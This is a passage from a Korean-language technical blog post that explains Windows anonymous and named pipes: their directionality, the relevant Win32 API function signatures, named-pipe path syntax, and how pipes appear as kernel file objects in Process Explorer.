&#xD30C;&#xC774;&#xD504;&#xC778;&#xB370;&#x2026; &#xC804;&#xD600; &#xAC10;&#xC774; &#xC548; &#xC624;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xC774;&#xB984;&#xC774; &#xB73B;&#xD558;&#xB294; &#xAC8C; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xBA3C;&#xC800; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/4.png" alt></p><p>&#xC774;&#xB984; &#xC5C6;&#xB294; &#xD30C;&#xC774;&#xD504;&#xC640; &#xC774;&#xB984;&#xC788;&#xB294; &#xD30C;&#xC774;&#xD504;&#xC5D0;&#xC11C; <strong>&#xC774;&#xB984;&#xC740; &#xD30C;&#xC774;&#xD504;&#xC758; &#xC8FC;&#xC18C;</strong>&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! </p><p>&#xD30C;&#xC774;&#xD504;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC788;&#xC744; &#xACBD;&#xC6B0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB098; &#xC6D0;&#xACA9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xBC18;&#xB300;&#xB85C; &#xC8FC;&#xC18C;&#xAC00; &#xC5C6;&#xC73C;&#xBA74; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC774; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;! </p><p>&#xC800;&#xAE30;&#xC694;? Pipe&#xB294; IPC &#xC911; &#xD558;&#xB098;&#xC778;&#xB370; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xC744; &#xBABB;&#xD55C;&#xB2E4;&#xB2C8; &#xC774;&#xAC8C; &#xB9D0;&#xC774; &#xB429;&#xB2C8;&#xAE4C;..? &#x2190; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xBC14;&#xB85C; &#xB4A4; Anonymous Pipe&#xC5D0;&#xC11C; &#xD480;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><p>&#xADF8;&#xB7FC; &#xD30C;&#xC774;&#xD504;&#xC758; &#xC8FC;&#xC18C;&#xB294; &#xBB34;&#xC5C7;&#xC744; &#xB9D0;&#xD558;&#xB294; &#xAC78;&#xAE4C;&#xC694;? &#xB85C;&#xCEEC; Pipe&#xC640; &#xC6D0;&#xACA9; Pipe&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9C0;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xC9C0;&#xB9CC; &#xC6D0;&#xACA9; Pipe&#xC5D0; &#xACBD;&#xC6B0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC0C1;&#xC5D0;&#xC11C; PC&#xB97C; &#xAD6C;&#xBD84;&#xD560; &#xC218; &#xC788;&#xB294; <strong>&#xCEF4;&#xD4E8;&#xD130; &#xC774;&#xB984;</strong>&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC704; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; &#xC2DC;&#xC2A4;&#xD15C; &#xC18D;&#xC131;&#xC5D0;&#xC11C; &#xCEF4;&#xD4E8;&#xD130; &#xC774;&#xB984;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC815;&#xB9AC;&#xD558;&#xC790;&#xBA74; Named Pipe&#xB294; &#xD30C;&#xC774;&#xD504; &#xC8FC;&#xC18C;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD1B5;&#xC2E0; &#xBC94;&#xC704;(&#xC6D0;&#xACA9;, &#xB85C;&#xCEEC;)&#xC5D0; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xBBF8;&#xB9AC; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xACE0;, Anonymous Pipe&#xB294; &#xBC14;&#xB85C; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="Anonymous-Pipe"><a href="#Anonymous-Pipe" class="headerlink" title="Anonymous Pipe"></a>Anonymous Pipe</h3><p><img src="/2025/05/12/ogu123/NamedPipe/KR/5.png" alt></p><p>&#xBA3C;&#xC800; Anonymous Pipe&#xB294; <strong>&#xB2E8;&#xBC29;&#xD5A5;</strong> &#xD2B9;&#xC131;&#xC744; &#xB744;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; <code>CreatePipe</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Pipe&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xBA74; &#xB2E8;&#xBC29;&#xD5A5; &#xD1B5;&#xC2E0;&#xC774;&#xBBC0;&#xB85C; &#xB450; &#xAC1C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xAC01;&#xC790; &#xC791;&#xC5C5;(Read/Write)&#xB97C; &#xD558;&#xAE30; &#xC704;&#xD55C; &#xD578;&#xB4E4;(hReadPipe, hWritePipe)&#xC744; &#xAC01;&#xAC01; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [out]          PHANDLE               hReadPipe,</span></span><span class="hljs-function"><span class="hljs-params">  [out]          PHANDLE               hWritePipe,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 nSize</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xC544;&#xB2C8;! &#xC704;&#xC5D0;&#xC11C; Anonymous Pipe&#xB294; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC811;&#xADFC; &#xBABB;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xB294;&#xB370; &#x201C;<strong>&#xB450; &#xAC1C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xAC01;&#xC790; &#xC791;&#xC5C5;(Read/Write)&#xB97C; &#xD558;&#xAE30; &#xC704;&#xD55C; &#xD578;&#xB4E4;(hReadPipe, hWritePipe)&#xC744; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;.</strong>&#x201D;&#xAC00; &#xBB34;&#xC2A8; &#xB9D0;&#xC785;&#xB2C8;&#xAE4C;&#x2026;? &#xACB0;&#xB860;&#xBD80;&#xD130; &#xB9D0;&#xC500;&#xB4DC;&#xB9AC;&#xBA74; Anonymous Pipe&#xB294; <strong>&#xBD80;&#xBAA8;-&#xC790;&#xC2DD; &#xAD00;&#xACC4;&#xC5D0; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xD1B5;&#xC2E0;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;</strong>&#xB429;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CreateProcess</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPCSTR                lpApplicationName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, out, optional] LPSTR                 lpCommandLine,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in]                BOOL                  bInheritHandles,</span></span><span class="hljs-function"><span class="hljs-params">  [in]                DWORD                 dwCreationFlags,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPVOID                lpEnvironment,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span><span class="hljs-function"><span class="hljs-params">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span><span class="hljs-function"><span class="hljs-params">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; <code>CreatePipe</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Pipe&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; <code>CreateProcess</code> &#xD568;&#xC218; bInheritHandles &#xC778;&#xC790; &#xAC12;&#xC744; True&#xB85C; &#xC124;&#xC815;&#xD574; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xB418;&#xBA74; &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD578;&#xB4E4; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC0C1;&#xC18D;&#xBC1B;&#xC544; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Anonymous Pipe&#xB85C; &#xD1B5;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xD1B5;&#xC2E0;&#xC740; <code>ReadFile</code>, <code>WriteFile</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D;, &#xC591;&#xBC29;&#xD5A5; &#xD1B5;&#xC2E0;&#xC744; &#xD558;&#xACE0; &#xC2F6;&#xB2E4;&#xBA74; &#xD30C;&#xC774;&#xD504;&#xB97C; &#xB450; &#xAC1C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;?</p><p>Anonymous Pipe&#xB97C; &#xC815;&#xB9AC;&#xD558;&#xBA74; Pipe&#xC5D0; &#xC774;&#xB984;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xC9C0;&#xB9CC; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xD578;&#xB4E4; &#xD14C;&#xC774;&#xBE14; &#xC0C1;&#xC18D;&#xC744; &#xD1B5;&#xD574; Pipe&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5B4; Anonymous Pipe&#xB294; &#xBD80;&#xBAA8;-&#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xD1B5;&#xC2E0;&#xC5D0; &#xD65C;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Named-Pipe"><a href="#Named-Pipe" class="headerlink" title="Named Pipe"></a>Named Pipe</h3><p><img src="/2025/05/12/ogu123/NamedPipe/KR/6.png" alt></p><p>Named Pipe&#xB294; <strong>&#xC591;&#xBC29;&#xD5A5;</strong> &#xD2B9;&#xC131;&#xC744; &#xB744;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; Pipe&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xCABD;&#xC744; &#xC11C;&#xBC84;, &#xC0DD;&#xC131;&#xB41C; Pipe&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xCABD;&#xC744; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB77C;&#xACE0; &#xD558;&#xBA70; Named Pipe&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xC911;&#xC694;&#xD55C; &#xD568;&#xC218;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA70; &#xC774;&#xD574;&#xD574; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC704; &#xADF8;&#xB9BC;&#xACFC; &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB4E4;&#xC744; &#xAC19;&#xC774; &#xD655;&#xC778;&#xD558;&#xC2DC;&#xBA74; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC218;&#xC6D4;&#xD558;&#xC2E4; &#xAC81;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs cpp">hPipe = HANDLE CreateNamedPipe(  [in]           LPCSTR                lpName,  [in]           DWORD                 dwOpenMode,  [in]           DWORD                 dwPipeMode,  [in]           DWORD                 nMaxInstances,  [in]           DWORD                 nOutBufferSize,  [in]           DWORD                 nInBufferSize,  [in]           DWORD                 nDefaultTimeOut,  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes);</code></pre><p>&#xBA3C;&#xC800; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; <code>CreateNamedPipe</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Pipe&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC591;&#xBC29;&#xD5A5; &#xD1B5;&#xC2E0;&#xC774;&#xBBC0;&#xB85C; &#xD55C; &#xAC1C;&#xC758; &#xD578;&#xB4E4;&#xC744; &#xC11C;&#xBC84;&#xC5D0;&#xAC8C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; <strong>lpName</strong> &#xC778;&#xC790;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xB294; Pipe&#xC758; &#xC774;&#xB984;&#xC774;&#xACE0;, <strong>dwOpenMode</strong> &#xC778;&#xC790;&#xB97C; &#xD1B5;&#xD574; Half-Duplex (&#xC11C;&#xBC84; &#x2192; &#xD074;&#xB77C;&#xC778;&#xD2B8;, &#xC11C;&#xBC84; &#x2190; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;)&#xB85C;&#xB3C4; &#xC124;&#xC815;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>nMaxInstances</strong> &#xC778;&#xC790;&#xB294; &#xC0DD;&#xC131;&#xB418;&#xB294; Pipe &#xC778;&#xC2A4;&#xD134;&#xC2A4; &#xAC1C;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD574;&#xB2F9; &#xAC12;&#xC774; 3&#xC77C; &#xACBD;&#xC6B0;, &#xAC19;&#xC740; &#xC774;&#xB984;&#xC758; Pipe&#xAC00; 3&#xAC1C;&#xAE4C;&#xC9C0; &#xC0DD;&#xC131;&#xB420; &#xC218; &#xC788;&#xACE0; &#xB530;&#xB77C;&#xC11C; &#xCD1D; 3&#xBA85;&#xC758; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC5F0;&#xACB0;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/7.png" alt></p><p>PipeList&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC2DC;&#xC2A4;&#xD15C; &#xB0B4;&#xC5D0; Named Pipe&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB9CC;&#xC57D;, Max Instances &#xAC12;&#xC774; 1&#xB85C; &#xC124;&#xC815;&#xB41C; Pipe&#xC5D0; &#xC5EC;&#xB7EC; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC694;&#xCCAD;&#xC774; &#xB4E4;&#xC5B4;&#xC62C; &#xACBD;&#xC6B0; &#xD558;&#xB098;&#xC758; Pipe&#xC640; &#xC5F0;&#xACB0;&#xB418;&#xACE0; &#xB0A8;&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xB300;&#xAE30; &#xC0C1;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xB300;&#xAE30;&#xD558;&#xB294; &#xC2DC;&#xAC04;&#xC740; <strong>nDefaultTimeOut</strong> &#xC778;&#xC790;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">ConnectNamedPipe(hPipe, <span class="hljs-literal">NULL</span>);</code></pre><p>&#xC11C;&#xBC84;&#xC5D0;&#xC11C; Pipe &#xC0DD;&#xC131; &#xD6C4; <code>ConnectNamedPipe</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Pipe&#xB97C; <strong>&#xC6D0;&#xACA9;, &#xB85C;&#xCEEC;&#xC5D0; &#xC788;&#xB294; &#xB2E4;&#xB978;  &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC5F0;&#xACB0; &#xB300;&#xAE30; &#xC0C1;&#xD0DC;</strong>&#xB85C; &#xC804;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. Pipe&#xB97C; &#xC678;&#xBD80;&#xC5D0; &#xB178;&#xCD9C;&#xC2DC;&#xD0A8;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs cpp"><span class="hljs-function">HANDLE <span class="hljs-title">CreateFile</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in]           LPCSTR                lpFileName,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 dwShareMode,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 dwCreationDisposition,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 dwFlagsAndAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] HANDLE                hTemplateFile</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xC774;&#xC81C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; <strong>lpFileName</strong> &#xC778;&#xC790;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xC11C;&#xBC84; Named Pipe &#xB123;&#xACE0; <code>CreateFile</code> &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; Named Pipe&#xB85C; &#xD1B5;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xD1B5;&#xC2E0;&#xC740; Anonymous Pipe&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; <code>ReadFile</code>, <code>WriteFile</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">WaitNamedPipe</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in] LPCSTR lpNamedPipeName,</span></span><span class="hljs-function"><span class="hljs-params">  [in] DWORD  nTimeOut</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xB9CC;&#xC57D; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; <code>CreateFile</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Pipe &#xC5F0;&#xACB0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C8;&#xC9C0;&#xB9CC;, &#xC11C;&#xBC84; Pipe &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xC804;&#xBD80; &#xC0AC;&#xC6A9; &#xC911;&#xC774;&#xB77C;&#xBA74; <code>WaitNamedPipe</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; <strong>nTimeOut</strong> &#xC778;&#xC790; &#xAC12;&#xB9CC;&#xD07C; &#xB300;&#xAE30;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; <strong>nTimeOut</strong> &#xC778;&#xC790;&#xAC00; default &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xACBD;&#xC6B0;, <code>CreateNamedPipe</code> &#xD568;&#xC218; <strong>nDefaultTimeOut</strong> &#xAC12;&#xB9CC;&#xD07C; &#xB300;&#xAE30;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; Anonymous Pipe&#xC640; Named Pipe&#xC5D0;&#xC11C; &#xC774;&#xB984;&#xC774; &#xBB34;&#xC5C7;&#xC744; &#xB73B;&#xD558;&#xACE0;, &#xAC01; Pipe&#xC758; &#xC0DD;&#xC131;&#xACFC; &#xC0AC;&#xC6A9;&#xC744; &#xCF54;&#xB4DC;&#xB85C;&#xC368; &#xD655;&#xC778;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xB9CC; &#xC544;&#xC154;&#xB3C4; Windows Pipe &#xCF54;&#xB4DC;&#xB4E4;&#xC744; &#xC774;&#xD574;&#xD558;&#xB294;&#xB370; &#xBB38;&#xC81C;&#xC5C6;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;!</p><h2 id="Windows-Named-pipe"><a href="#Windows-Named-pipe" class="headerlink" title="Windows Named pipe"></a>Windows Named pipe</h2><p>&#xC774;&#xC81C; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; Named Pipe&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/8.png" alt></p><p><code>CreatePipe</code>&#xB098; <code>CreateNamedPipe</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC0DD;&#xC131;&#xB41C; &#xD30C;&#xC774;&#xD504;&#xB294; &#xCEE4;&#xB110; &#xC601;&#xC5ED;&#xC5D0; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xBA70;, &#xC77C;&#xC885;&#xC758; <strong>&#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;</strong>&#xCC98;&#xB7FC; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. Windows&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; File Object&#xB85C; &#xCDE8;&#xAE09;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC704; &#xADF8;&#xB9BC;&#xC5D0;&#xC11C; Pipe&#xAC00; File Object&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p>&#xB530;&#xB77C;&#xC11C;, &#xD30C;&#xC774;&#xD504;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC8FC;&#xACE0;&#xBC1B;&#xC744; &#xB54C;&#xB294; <code>ReadFile</code>&#xC774;&#xB098; <code>WriteFile</code> &#xAC19;&#xC740; &#xD30C;&#xC77C; &#xAD00;&#xB828; API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Named Pipe&#xC758; &#xACBD;&#xC6B0; Pipe &#xC774;&#xB984;&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC6D0;&#xACA9;, &#xB85C;&#xCEEC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5F0;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; Pipe &#xC774;&#xB984; &#xAE30;&#xBCF8; &#xAD6C;&#xC870;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">\\&#xC11C;&#xBC84;&#xC774;&#xB984;\pipe\&#xD30C;&#xC774;&#xD504;&#xC774;&#xB984;</code></pre><ul><li>&#xC11C;&#xBC84; &#xCE21;: <code>\\.\pipe\ogu123</code><ul><li>&#xC11C;&#xBC84;&#xB294; &#xBCF8;&#xC778; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C; Pipe&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC11C;&#xBC84; &#xC774;&#xB984;&#xC5D0; .(dot)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xD30C;&#xC774;&#xD504; &#xC774;&#xB984;(<code>ogu123</code>)&#xC744; &#xB123;&#xACE0; <code>CreateNamedPipe</code> &#xD568;&#xC218; lpName &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xCE21;: <code>\\.\pipe\ogu123</code> or <code>\\ComputerName\pipe\ogu123</code><ul><li>&#xC5F0;&#xACB0;&#xD558;&#xACE0; &#xC2F6;&#xC740; Pipe&#xAC00; &#xB85C;&#xCEEC; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA74; <code>\\.\pipe\ogu123</code></li><li>&#xC5F0;&#xACB0;&#xD558;&#xACE0; &#xC2F6;&#xC740; Pipe&#xAC00; &#xC6D0;&#xACA9; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA74; <code>\\ComputerName\pipe\ogu123</code></li></ul></li></ul><p><img src="/2025/05/12/ogu123/NamedPipe/KR/9.png" alt></p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; Pipe &#xC704;&#xCE58;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; Pipe &#xC774;&#xB984; &#xAD6C;&#xC870;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB9CC;&#xC57D;, &#xC11C;&#xBC84; &#xCE21;&#xC5D0;&#xC11C; <code>\\.\pipe\ogu123</code>&#xB97C; &#xD1B5;&#xD574; Pipe&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;&#xBA74; <code>ogu123</code> Pipe&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB290; &#xACBD;&#xB85C;&#xC5D0; &#xC0DD;&#xC131;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/10.png" alt></p><p>NamedPipeServer.exe&#xB294; <code>ogu123</code> Pipe&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. Process Explorer&#xB85C; NamedPipeServer.exe &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD578;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; <code>ogu123</code> 